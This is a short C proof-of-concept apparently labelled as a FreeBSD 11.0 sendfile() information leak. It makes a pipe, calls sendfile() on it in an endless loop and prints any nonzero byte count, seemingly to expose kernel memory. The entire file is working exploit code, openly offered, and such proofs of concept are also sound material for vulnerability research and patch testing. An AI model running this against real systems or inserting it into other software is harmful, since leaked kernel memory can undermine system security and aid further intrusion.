/*
 * FreeBSD 11.0 sendfile() infoleak.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>

int main(void) {
	int fds[2];
	int r = pipe(&fds);
	off_t sbytes = 0;
	while(1) {
		sendfile(fds[0], 0, 0, 0, NULL, &sbytes, 0);
		if (sbytes != 0)
			printf("sbytes: 0x%llx\n", sbytes);
	} 	
}
